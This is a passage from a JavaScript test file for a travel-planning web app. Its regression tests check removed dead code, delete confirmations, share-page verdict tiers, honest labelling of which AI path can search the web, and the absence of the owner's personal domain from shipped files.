  assert.ok(trip.indexOf("getElementById('modal-result')") !== -1);
  assert.ok(trip.indexOf("getElementById('modal-result-content')") !== -1);
  // applyAIResponse() was called by a button and defined nowhere.
  assert.equal(trip.indexOf('applyAIResponse'), -1, 'a call to an undefined function came back');
  assert.equal(trip.indexOf('id="modal-paste-back"'), -1, 'the dead paste-back box came back');
  // The Collapse all bar hung off `.wrap > header.hero`, a class this surface
  // has never had, so the bar was never built.
  assert.equal(trip.indexOf('header.hero'), -1, 'the dead header selector came back');
  assert.ok(trip.indexOf(".querySelector('.wrap > header.apphdr')") !== -1);
  // Deleting a stay or an idea now arms the same way deleting a stop does.
  ['deleteCity:', 'removeAccom:', 'removeIdea:'].forEach(function (key) {
    assert.ok(trip.indexOf("armConfirm('" + key) !== -1, key + ' lost its confirmation');
  });
  // A beacon that reports nothing still costs a third-party request per load.
  assert.equal(trip.indexOf('cloudflareinsights'), -1);
  assert.equal(trip.indexOf('YOUR_TOKEN_HERE'), -1);
});

test('a published share carries the verdict tier, and the page renders it', () => {
  // The snapshot builder copied `v.label`, a field no verdict has, so every
  // share Rob has sent showed the reason with no Must/Good/Skip on it.
  const row = {
    city_id: 'c1',
    data: {
      schema: 1,
      city: { name: 'Batumi', dates: { from: '2026-08-08', to: '2026-08-15' } },
      sections: [{ id: 's', label: 'Dinner' }],
      items: [{
        id: 'i1', section: 's', name: 'Brasserie',
        intel: { verdicts: [
          { tier: 'must', text: 'the khachapuri' },
          { tier: 'skip', text: 'the terrace in August' },
          { tier: 'good', text: 'a long dinner' },
          { text: 'no tier at all' }
        ] }
      }]
    }
  };
  const snap = C.shareKit.build({
    generatedAt: '2026-09-01T00:00:00.000Z', cities: [], transitions: [],
    guides: [row], includeGuides: ['c1']
  });
  const verdicts = snap.guides[0].items[0].verdicts;
  assert.deepEqual(verdicts.map(function (v) { return v.tier; }),
    ['must', 'skip', 'good', 'good']);
  assert.deepEqual(verdicts[0], { tier: 'must', text: 'the khachapuri' });
  verdicts.forEach(function (v) {
    assert.equal(v.label, undefined, 'the dead label field came back');
  });
  // And the share page turns the tier into the same three words the app uses.
  const fs = require('fs');
  const path = require('path');
  const page = fs.readFileSync(path.join(__dirname, '..', 'share', 'index.html'), 'utf8');
  assert.ok(page.indexOf("tier === 'must' ? 'Must'") !== -1);
  assert.equal(page.indexOf('v.label'), -1, 'the share page still reads the dead field');
  // The footer claimed to auto-update directly above the note saying it is a
  // snapshot. Both cannot be true and the snapshot one is.
  assert.equal(page.indexOf('Auto-updating'), -1, 'the false auto-update line came back');
  assert.equal(page.indexOf('footer-meta'), -1, 'the element it wrote into came back');
  assert.ok(page.indexOf('This page is a snapshot taken when the traveler pressed Publish') !== -1);
});

test('the AI copy says which path can actually search the web', () => {
  // No in-app call declares a web-search tool, so Run with Claude answers from
  // the model's own knowledge while the copy-to-chat path can go and look. The
  // prompts ask for current hours, prices and ratings either way, so the
  // difference has to be on screen.
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const app = fs.readFileSync(path.join(root, 'src', 'app-shell.html'), 'utf8');
  const trip = fs.readFileSync(path.join(root, 'src', 'trip-shell.html'), 'utf8');
  assert.equal(app.indexOf('tools:'), -1, 'an in-app call grew a tool declaration; update this copy');
  assert.ok(app.indexOf("no web access") !== -1);
  assert.ok(app.indexOf('search the web') !== -1);
  assert.ok(trip.indexOf('no web access') !== -1);
  // The Enrich modal closed with a promise that three working buttons above it
  // had already kept.
  assert.equal(app.indexOf('In-app research is planned for a future version'), -1);
});

// ---- no owner's personal address ships to strangers ----
//
// Until 2026-09-01 both footers linked wheres.robriggs.com, the owner's own
// family itinerary page, and the trip footer carried a personal-site byline.
// That was harmless while he was the only account and wrong the moment public
// sign-ups open: every stranger would have been handed one person's private
// travel link on every screen.
//
// This asserts on the SHIPPED bytes rather than on src/, because shipped is
// what a browser downloads: the engine is inlined into four of these files, so
// a personal link reintroduced anywhere upstream lands here. sw.js and the
// trip.html redirect stub are in the list because they are served too.
//
// robriggs3 (the GitHub account) is deliberately NOT caught: the repo, the
// issue tracker and the star link are the public project, not a private page.
// The needle is the personal DOMAIN, so github.com/robriggs3/... passes and
// anything at robriggs.com fails.
test('no shipped surface links the owner personal pages', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const surfaces = [
    'index.html', 'trip/index.html', 'share/index.html',
    'template.html', 'example.html', 'sw.js', 'trip.html'
  ];
  // Each needle with the reason it is banned, so a failure says what to do.
  const banned = [
    ['robriggs.com', 'the personal domain (wheres, cityops or the byline)'],
    ['robs-travel-itinerary', 'the retired family-page filename']
  ];
  surfaces.forEach(function (rel) {
    const text = fs.readFileSync(path.join(root, rel), 'utf8');
    banned.forEach(function (pair) {
      assert.equal(text.indexOf(pair[0]), -1,
        rel + ' ships "' + pair[0] + '": ' + pair[1] +
        '. Strangers see this. Remove it from src/ and re-run tools/assemble.js.');
    });
  });
  // And the replacement is actually there, in both footers, or the sweep would
  // pass just as well on a footer with a hole in it.
  const app = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  const trip = fs.readFileSync(path.join(root, 'trip', 'index.html'), 'utf8');
  assert.ok(app.indexOf('https://nomadding.com/demo/') !== -1,
    'the city app footer lost its sample-plan link');
  assert.ok(trip.indexOf('https://nomadding.com/demo/') !== -1,
    'the trip footer lost its sample-plan link');
});

// The async tests above resolve on a microtask, so the summary has to wait
// for them or it reports before they have run and the exit code lies.
//
// With a deadline, because polling for a counter to reach zero is a hang
// waiting to happen: a promise that never settles would otherwise reschedule
// this forever and CI would sit at "no output" instead of failing. Ten
// seconds is roughly a thousand times what the mocked-fetch tests take.
const ASYNC_DEADLINE_MS = 10000;
const asyncStartedAt = Date.now();
function finish() {
  if (asyncPending > 0) {
    if (Date.now() - asyncStartedAt > ASYNC_DEADLINE_MS) {
      fail += asyncPending;
      console.log('FAIL ' + asyncPending + ' async test(s) never settled within ' +
        (ASYNC_DEADLINE_MS / 1000) + 's');
    } else {
      setTimeout(finish, 5);
      return;
    }
  }
  console.log(pass + ' passed, ' + fail + ' failed');
  if (fail) process.exit(1);
}
finish();
